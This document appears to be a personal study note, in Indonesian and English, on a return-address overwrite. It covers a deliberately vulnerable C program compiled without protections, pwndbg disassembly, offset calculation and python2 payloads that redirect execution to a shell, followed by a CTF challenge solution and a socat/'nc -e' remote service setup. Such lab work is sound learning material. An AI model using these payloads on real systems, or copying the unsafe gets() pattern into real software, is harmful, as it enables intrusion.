# 5 - overwrite return address (x86 - 64)


### buffer3.c
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("Boleh lah bolehlah jadi admin bolehlah\n");
    fflush(stdout);
    system("/bin/sh");
}

void danger(){
    char buff[21];
    gets(&buff);
}

int main(){
    danger();
    return 0;
}

// compile ke 64 bit
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -Wno-implicit-function-declaration buffer3.c -o buffer3_64
```

## Analyze func
```c
pwndbg> disas main
Dump of assembler code for function main:
   0x0000000000401182 <+0>:	push   rbp
   0x0000000000401183 <+1>:	mov    rbp,rsp
   0x0000000000401186 <+4>:	call   0x401166 <danger>
   0x000000000040118b <+9>:	mov    eax,0x0
   0x0000000000401190 <+14>:	pop    rbp
   0x0000000000401191 <+15>:	ret
End of assembler dump.
pwndbg> disas danger
Dump of assembler code for function danger:
   0x0000000000401166 <+0>:	push   rbp
   0x0000000000401167 <+1>:	mov    rbp,rsp
   0x000000000040116a <+4>:	sub    rsp,0x20
   0x000000000040116e <+8>:	lea    rax,[rbp-0x20]
   0x0000000000401172 <+12>:	mov    rdi,rax
   0x0000000000401175 <+15>:	mov    eax,0x0
   0x000000000040117a <+20>:	call   0x401050 <gets@plt>
   0x000000000040117f <+25>:	nop
   0x0000000000401180 <+26>:	leave
   0x0000000000401181 <+27>:	ret
End of assembler dump.
pwndbg> disas win
Dump of assembler code for function win:
   0x0000000000401146 <+0>:	push   rbp
   0x0000000000401147 <+1>:	mov    rbp,rsp
   0x000000000040114a <+4>:	mov    edi,0x402008
   0x000000000040114f <+9>:	mov    eax,0x0
   0x0000000000401154 <+14>:	call   0x401040 <printf@plt>
   0x0000000000401159 <+19>:	mov    edi,0x402030
   0x000000000040115e <+24>:	call   0x401030 <system@plt>
   0x0000000000401163 <+29>:	nop
   0x0000000000401164 <+30>:	pop    rbp
   0x0000000000401165 <+31>:	ret
End of assembler dump.
pwndbg> 
```

- breakpoint ke danger, setelah setup stack   0x000000000040116e <+8>:	lea    rax,[rbp-0x20]
```c
00:0000│ rsp 0x7fffffffdb70 ◂— 0 // ini
... ↓        2 skipped
03:0018│-008 0x7fffffffdb88 —▸ 0x7ffff7fe4780 ◂— push rbp
04:0020│ rbp 0x7fffffffdb90 —▸ 0x7fffffffdba0 ◂— 1 // ke ini
05:0028│+008 0x7fffffffdb98 —▸ 0x40118b (main+9) ◂— mov eax, 0 // ini ret addr nya
06:0030│+010 0x7fffffffdba0 ◂— 1
07:0038│+018 0x7fffffffdba8 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
```
- disini :    0x000000000040116a <+4>:	sub    rsp,0x20 -> 0x20 = 32 + saved rbp (8)
- buffer (32) + saved rbp(8)  -> need: 40 offset payload
- payload: A x 40 -> + payload ret addr reverse
- 0x0000000000401146 -> reverse dulu, 46 11 40 00 00 00 00 00
```bash
python2 -c "print 'A' * 40 + '\x46\x11\x40\x00\x00\x00\x00\x00'" | ./buffer3_64
```
- atau gini juga udah bisa
```bash
python2 -c "print 'A' * 40 + '\x46\x11\x40'" | ./buffer3_64
```
- gatau kenapa tapi kok gabisa ya interactive shell nya
```bash
(python2 -c "print 'A'*40 + '\x46\x11\x40'";cat -) | ./buffer3_64
Boleh lah bolehlah jadi admin bolehlah
ls
[1]    16187 done                ( python2 -c "print 'A'*40 + '\x46\x11\x40'"; /usr/bin/batcat -; ) | 
       16189 segmentation fault  ./buffer3_64
```


## Remote
- mode remote exploit, biar kayak di ctf2 biasanya
- server yg run service tadi: ./buffer3_64
- client ngirim payload ke server, nanti kalau berhasil server ngasih shell
```bash
python -c 'payload' | nc [server] [port]
```
- server:
```bash
socat tcp-listen:6060,reuseaddr,fork,exec:./buffer3_64 // kalau pakai socat
nc -lvnp 6060 -e ./buffer3_64 // kalau pakai nc
```
- client
```bash
(python2 -c "print 'A'*40 + '\x46\x11\x40'";cat -) | nc 127.0.0.1 6060
```


## Coba soal
- nyoba soal :
- link disini: https://goo.gl/BZ5ERT
- download, chmod and langsung debug aja
```c
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400488  _init
0x00000000004004c0  puts@plt
0x00000000004004d0  write@plt
0x00000000004004e0  system@plt
0x00000000004004f0  read@plt
0x0000000000400500  __libc_start_main@plt
0x0000000000400510  __gmon_start__@plt
0x0000000000400520  _start
0x0000000000400550  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x00000000004005f0  frame_dummy
0x0000000000400616  indonesia
0x0000000000400626  jalan_keflag
0x0000000000400646  main
0x0000000000400680  __libc_csu_init
0x00000000004006f0  __libc_csu_fini
0x00000000004006f4  _fini
pwndbg> disas main
Dump of assembler code for function main:
   0x0000000000400646 <+0>:	push   rbp
   0x0000000000400647 <+1>:	mov    rbp,rsp
   0x000000000040064a <+4>:	sub    rsp,0x10
   0x000000000040064e <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400651 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400655 <+15>:	mov    edx,0x5a
   0x000000000040065a <+20>:	mov    esi,0x400718 // string
   0x000000000040065f <+25>:	mov    edi,0x1
   0x0000000000400664 <+30>:	call   0x4004d0 <write@plt>
   0x0000000000400669 <+35>:	mov    eax,0x0
   0x000000000040066e <+40>:	call   0x400626 <jalan_keflag> // fungsi
   0x0000000000400673 <+45>:	mov    edi,0x400772
   0x0000000000400678 <+50>:	call   0x4004c0 <puts@plt>
   0x000000000040067d <+55>:	leave
   0x000000000040067e <+56>:	ret
End of assembler dump.
pwndbg> 
```
- check esi (string) 0x000000000040065a <+20>:	mov    esi,0x400718
```c
pwndbg> x/s 0x400718
0x400718:	"++IMPOSSIBLE MISSIONS FORCE - SEKTOR MAMPANG PRAPATAN++\n\t\tServer Akses\nMasukkan ID Agen: "
```
- check fungsi jalan_keflag and fungsi indonesia
```c
pwndbg> disas jalan_keflag
Dump of assembler code for function jalan_keflag:
   0x0000000000400626 <+0>:	push   rbp
   0x0000000000400627 <+1>:	mov    rbp,rsp
   0x000000000040062a <+4>:	add    rsp,0xffffffffffffff80
   0x000000000040062e <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400632 <+12>:	mov    edx,0x200
   0x0000000000400637 <+17>:	mov    rsi,rax
   0x000000000040063a <+20>:	mov    edi,0x0
   0x000000000040063f <+25>:	call   0x4004f0 <read@plt> // ada read
   0x0000000000400644 <+30>:	leave
   0x0000000000400645 <+31>:	ret
End of assembler dump.
pwndbg> disas indonesia
Dump of assembler code for function indonesia:
   0x0000000000400616 <+0>:	push   rbp
   0x0000000000400617 <+1>:	mov    rbp,rsp
   0x000000000040061a <+4>:	mov    edi,0x400708
   0x000000000040061f <+9>:	call   0x4004e0 <system@plt> // ada system
   0x0000000000400624 <+14>:	pop    rbp
   0x0000000000400625 <+15>:	ret
End of assembler dump.
```
- di func indonesia check param nya 0x000000000040061a <+4>:	mov    edi,0x400708
```c
pwndbg> x/s 0x400708
0x400708:	"cat flag.txt"
```
- vuln di :
```c
   0x000000000040062e <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400632 <+12>:	mov    edx,0x200
   0x0000000000400637 <+17>:	mov    rsi,rax
   0x000000000040063a <+20>:	mov    edi,0x0
   0x000000000040063f <+25>:	call   0x4004f0 <read@plt> // ada read
```
- read(0, [rbp -0x80 ], 0x200)
- read func :
```c
ssize_t read(int fd, void buf[.count], size_t count); // file descriptor, std input, count berapa banyak yg akan dibaca
```
- break di jalan_keflag setelah ini 0x000000000040062a <+4>: add rsp,0xffffffffffffff80, -80 
```c
pwndbg> break *jalan_keflag+8
Breakpoint 1 at 0x40062e
pwndbg> run
RBP  0x7fffffffdb70 —▸ 0x7fffffffdb90 ◂— 1
RSP  0x7fffffffdaf0 ◂— 0
```
- stack besar 128byte, buffer 128byte + rbp 8 byte = 136byte yg perlu di timpa
```bash
python2 -c "print 'A' * 136 + 'CCCC'" > pelod.txt
```
- run ulang
```c
pwndbg> run < pelod.txt
pwndbg> ni
pwndbg> ni ni ni ni terus sampai leave ke ret
00:0000│ rsp 0x7fffffffdb78 ◂— 0xa43434343 /* 'CCCC\n' */ // ret return cccc\n enternya masuk, dari fungsi read
01:0008│     0x7fffffffdb80 —▸ 0x7fffffffdca8 —▸ 0x7fffffffe066 ◂— '/home/tomba/binex/idsecconf_pwneasy'
02:0010│     0x7fffffffdb88 ◂— 0x100000000
03:0018│     0x7fffffffdb90 ◂— 1
04:0020│     0x7fffffffdb98 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
05:0028│     0x7fffffffdba0 ◂— 0
06:0030│     0x7fffffffdba8 —▸ 0x400646 (main) ◂— push rbp
07:0038│     0x7fffffffdbb0 ◂— 0x100000000
```
- replace ke func indonesia
```c
pwndbg> disas indonesia
Dump of assembler code for function indonesia:
   0x0000000000400616 <+0>:	push   rbp
   0x0000000000400617 <+1>:	mov    rbp,rsp
   0x000000000040061a <+4>:	mov    edi,0x400708
   0x000000000040061f <+9>:	call   0x4004e0 <system@plt>
   0x0000000000400624 <+14>:	pop    rbp
   0x0000000000400625 <+15>:	ret
End of assembler dump.
```
- nih reverse aja
```c
0x0000000000400616 -> 40 06 16 -> 16 06 40
```
- ubah payload 
```bash
python2 -c "print 'A' * 136 + '\x16\x06\x40'" > pelod.txt
```
- next coba run < pelod.txt di dbg nya, next into
```c
00:0000│ rsp 0x7fffffffdb78 ◂— 0xa400616 // newline tetap kebaca \n nya, a nya newline, ada a di depan
01:0008│     0x7fffffffdb80 —▸ 0x7fffffffdca8 —▸ 0x7fffffffe066 ◂— '/home/tomba/binex/idsecconf_pwneasy'
02:0010│     0x7fffffffdb88 ◂— 0x100000000
03:0018│     0x7fffffffdb90 ◂— 1
04:0020│     0x7fffffffdb98 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
05:0028│     0x7fffffffdba0 ◂— 0
06:0030│     0x7fffffffdba8 —▸ 0x400646 (main) ◂— push rbp
07:0038│     0x7fffffffdbb0 ◂— 0x100000000
```
- penuhin sampai 8 byte kalau gitu payload nya
```bash
python2 -c "print 'A' * 136 + '\x16\x06\x40\x00\x00\x00\x00\x00'" > pelod.txt
```
- run ulang kayak tadi
```c
00:0000│ rsp 0x7fffffffdb78 —▸ 0x400616 (indonesia) ◂— push rbp // nah masuk
01:0008│     0x7fffffffdb80 —▸ 0x7fffffffdc0a ◂— 0 // newline masuk kesini
02:0010│     0x7fffffffdb88 ◂— 0x100000000
03:0018│     0x7fffffffdb90 ◂— 1
04:0020│     0x7fffffffdb98 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
05:0028│     0x7fffffffdba0 ◂— 0
06:0030│     0x7fffffffdba8 —▸ 0x400646 (main) ◂— push rbp
07:0038│     0x7fffffffdbb0 ◂— 0x100000000
```
- run di bash
```bash
python2 -c "print 'A' * 136 + '\x16\x06\x40\x00\x00\x00\x00\x00'" | ./idsecconf_pwneasy
```